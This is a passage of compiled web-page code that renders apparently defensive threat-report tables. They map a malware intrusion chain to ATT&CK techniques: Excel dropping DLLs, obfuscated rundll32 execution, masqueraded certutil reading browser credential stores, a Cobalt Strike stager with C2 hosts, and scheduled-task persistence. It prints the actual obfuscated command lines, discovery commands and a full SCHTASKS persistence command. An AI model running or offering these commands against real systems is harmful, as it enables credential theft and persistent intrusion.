",(0,l.kt)("inlineCode",{parentName:"td"},"pilotscience[.]com"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Excel dropped  malicious .dll file."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\PG102WY8\\\\L1KJS42TeHKjR8H[1].dll"))))),(0,l.kt)("h3",{id:"threat-actor-used-embedded-office-macro-to-execute-dll-files-via-rundll32-for-defense-evasion"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Embedded Office Macro")," to execute ",(0,l.kt)("em",{parentName:"h3"},".dll")," files via ",(0,l.kt)("em",{parentName:"h3"},"RunDll32")," for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-3"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-3"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("li",{parentName:"ul"},"T1027 - Obfuscated Files or Information")),(0,l.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011",(0,l.kt)("br",null),"T1027"),(0,l.kt)("td",{parentName:"tr",align:null},"Excel spawned ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," to execute malicious dll with obfuscated command-line arguments (bestb.ocx, DllRegisterServer)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\SysWow64\\\\rundll32.exe ..\\\\besta.ocx,D\\"&\\"l\\"&\\"l\\"&\\"R\\"&\\"eg\\"&\\"i\\"&\\"s\\"&\\"t\\"&\\"e\\"&\\"rS\\"&\\"e\\"&\\"rver'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\SysWow64\\\\rundll32.exe ..\\\\bestb.ocx,D\\"&\\"l\\"&\\"l\\"&\\"R\\"&\\"eg\\"&\\"i\\"&\\"s\\"&\\"t\\"&\\"e\\"&\\"rS\\"&\\"e\\"&\\"rver'))))),(0,l.kt)("h4",{id:"notes-2"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},".ocx file extensions correspond to ActiveX control modules"),(0,l.kt)("li",{parentName:"ul"},"The command-line shows an obfuscated parameter that resolves to the well known 'DllRegisterServer' function name."),(0,l.kt)("li",{parentName:"ul"},"Variations on .ocx file name (besta.ocx and bestb.ocx) as observed in different investigations")),(0,l.kt)("h3",{id:"threat-actor-used-nested-invocations-of-rundll32-for-defense-evasion"},"Threat actor used nested invocations of ",(0,l.kt)("em",{parentName:"h3"},"RunDll32")," for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-4"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-4"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32")),(0,l.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned itself to execute malicious dll (qoknamoiohhcrxw.oir,dIaBG)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\SysWOW64\\\\rundll32.exe \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Bfzefze\\\\qoknamoiohhcrxw.oir\\",dIaBG'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned itself to execute malicious dll (qoknamoiohhcrxw.oir,DllRegisterServer)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\SysWOW64\\\\rundll32.exe \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Bfzefze\\\\qoknamoiohhcrxw.oir\\",DllRegisterServer'))))),(0,l.kt)("h3",{id:"threat-actor-used-http-connections-to-downloaded-a-masqueraded-copy-of-certutil-for-command-and-control"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"HTTP connections")," to downloaded a masqueraded copy of ",(0,l.kt)("em",{parentName:"h3"},"CERTUTIL")," for Command And Control."),(0,l.kt)("h4",{id:"tactic-5"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-5"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1036 - Masquerading"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," performed network connections."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"209.239.112[.]82"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1036",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," dropped  masqueraded copies of ",(0,l.kt)("em",{parentName:"td"},"CERTUTIL"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\\\\\riboziydzd.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\\\\\nfysitwtyygcw.exe"))))),(0,l.kt)("h4",{id:"notes-3"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"riboziydzd.exe is not signed")),(0,l.kt)("h3",{id:"threat-actor-used-windows-registry-autorun-keys-for-persistence"},"Threat actor used Windows Registry Autorun keys for Persistence."),(0,l.kt)("h4",{id:"tactic-6"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Persistence")),(0,l.kt)("h4",{id:"techniques-6"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder")),(0,l.kt)("h4",{id:"behaviors-and-observables-6"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1547.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," created persistence via Autorun entries."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RegKey Created"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"HKCU\\\\SOFTWARE\\\\MICROSOFT\\\\WINDOWS\\\\CURRENTVERSION\\\\RUN"))))),(0,l.kt)("h3",{id:"threat-actor-used-rundll32-to-launch-and-inject-certutil-for-execution"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"RunDll32")," to launch and inject ",(0,l.kt)("em",{parentName:"h3"},"CERTUTIL")," for Execution."),(0,l.kt)("h4",{id:"tactic-7"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-7"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("li",{parentName:"ul"},"T1055 - Process Injection")),(0,l.kt)("h4",{id:"behaviors-and-observables-7"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned masqueraded copy of ",(0,l.kt)("em",{parentName:"td"},"CERTUTIL"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\\\\\nfysitwtyygcw.exe\\" /scomma \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\8C0F.tmp\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1055"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," injected the masqueraded ",(0,l.kt)("em",{parentName:"td"},"CERTUTIL")," process."),(0,l.kt)("td",{parentName:"tr",align:null})))),(0,l.kt)("h3",{id:"threat-actor-used-certutil-to-access-web-browser-credentials-stores-for-credential-access"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"CERTUTIL")," to access Web Browser credentials stores for Credential Access."),(0,l.kt)("h4",{id:"tactic-8"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-8"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1555.003 - Credentials from Password Stores: Credentials from Web Browsers"),(0,l.kt)("li",{parentName:"ul"},"T1106 - Native API")),(0,l.kt)("h4",{id:"behaviors-and-observables-8"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CERTUTIL")," (masqueraded and injected) read Chrome credentials store (Login Data)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Read"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003",(0,l.kt)("br",null),"T1106"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CERTUTIL")," (masqueraded and injected) called CryptUnprotectData API."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"API Invoked"),": ",(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"API Invoked"),": n/d")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CERTUTIL")," (masqueraded and injected) accessed Firefox credential store (key4.db)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Modified"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\Users\\#{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{random}.default-release\\key4.db"))))),(0,l.kt)("h4",{id:"notes-4"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"key4.db is a SQLite database that stores passwords.")),(0,l.kt)("h3",{id:"threat-actor-used-http-to-download-cobalt-strike-stager-dll-for-command-and-control"},"Threat actor used HTTP to download ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," stager DLL for Command And Control."),(0,l.kt)("h4",{id:"tactic-9"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-9"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-9"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," dropped  Cobalt Strike stager DLL at ",(0,l.kt)("em",{parentName:"td"},"AppData","\\","Local")," folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Bfzefze\\\\uztmfjfrgicq.dll"))))),(0,l.kt)("h3",{id:"threat-actor-used-regsvr32-to-execute-cobalt-strike-stager-dll-for-execution"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"RegSvr32")," to execute Cobalt Strike Stager DLL for Execution."),(0,l.kt)("h4",{id:"tactic-10"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-10"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.010 - Signed Binary Proxy Execution: Regsvr32"),(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols")),(0,l.kt)("h4",{id:"behaviors-and-observables-10"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned ",(0,l.kt)("em",{parentName:"td"},"RegSvr32")," to execute Cobalt Strike Stager DLL"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\SysWOW64\\\\regsvr32.exe -s \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Bfzefze\\\\uztmfjfrgicq.dll\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RegSvr32")," connected to default Cobalt Strike named pipe (postex_*)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"NamedPipe Connected"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\\.\\pipe\\postex_b4a6"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RegSvr32")," performed multiple network connections to Cobalt Strike C2 server (guvonuk","[.]","com)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"45.147.228[.]140"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"guvonuk[.]com"))))),(0,l.kt)("h3",{id:"threat-actor-used-process-injection-into-mstscexe-to-launch-cobalt-strike-post-exploitation-tasks-for-command-and-control"},"Threat actor used process injection into ",(0,l.kt)("em",{parentName:"h3"},"mstsc.exe")," to launch Cobalt Strike post-exploitation tasks for Command And Control."),(0,l.kt)("h4",{id:"tactic-11"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-11"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.010 - Signed Binary Proxy Execution: Regsvr32")),(0,l.kt)("h4",{id:"behaviors-and-observables-11"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RegSvr32")," spawned mstsc.exe"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\mstsc.exe"))))),(0,l.kt)("h3",{id:"threat-actor-used-cobalt-strike-to-launch-system-native-tools-for-discovery"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," to launch system native tools for Discovery."),(0,l.kt)("h4",{id:"tactic-12"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-12"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.010 - Signed Binary Proxy Execution: Regsvr32"),(0,l.kt)("li",{parentName:"ul"},"T1087.002 - Account Discovery: Domain Account"),(0,l.kt)("li",{parentName:"ul"},"T1069 - Permission Groups Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1018 - Remote System Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-12"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"mstsc.exe")," spawned CMD for discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C ping #{domain}"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"mstsc.exe")," spawned ",(0,l.kt)("em",{parentName:"td"},"RunDll32"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\SysWow64\\\\rundll32.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1087.002",(0,l.kt)("br",null),"T1069",(0,l.kt)("br",null),"T1018",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C ping"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C wmic /NAMESPACE:\\\\\\\\root\\\\directory\\\\ldap PATH ds_user GET ds_mail"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C systeminfo"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_group where \"ds_samaccountname='Domain Admins'\" Get ds_member /Value"))))),(0,l.kt)("h3",{id:"threat-actor-used-http-to-downloaded-additional-cobalt-strike-dll-files-for-command-and-control"},"Threat actor used HTTP to downloaded additional Cobalt Strike ",(0,l.kt)("em",{parentName:"h3"},"dll")," files for Command And Control."),(0,l.kt)("h4",{id:"tactic-13"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-13"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-13"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," dropped  malicious ",(0,l.kt)("em",{parentName:"td"},"DLL")," files at ",(0,l.kt)("em",{parentName:"td"},"Temp")," and ",(0,l.kt)("em",{parentName:"td"},"ProgramData")," folders."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\Temp\\\\log.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Saved Games\\\\log.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\log.dll"))))),(0,l.kt)("h3",{id:"threat-actor-used-schtask-to-create-an-scheduled-task-that-executes-the-cobalt-strike-beacon-for-persistence"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"SCHTASK")," to create an scheduled task that executes the Cobalt Strike beacon for Persistence."),(0,l.kt)("h4",{id:"tactic-14"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Persistence")),(0,l.kt)("h4",{id:"techniques-14"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1053 - Scheduled Tasks"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-14"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1053",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned _CMD for creating Persistence via SCHTASK."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C SCHTASKS /create /tn \\"ObjectStoreRecoveryUpdateTask2\\" /tr \\"rundll32 C:\\\\Users\\\\#{user}\\\\Saved Games\\\\log.dll Helper pov\\" /sc minute /mo 35'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003",(0,l.kt)("br",null),"T1053"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for executing scheduled task via SCHTASK."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C SCHTASKS /run /TN 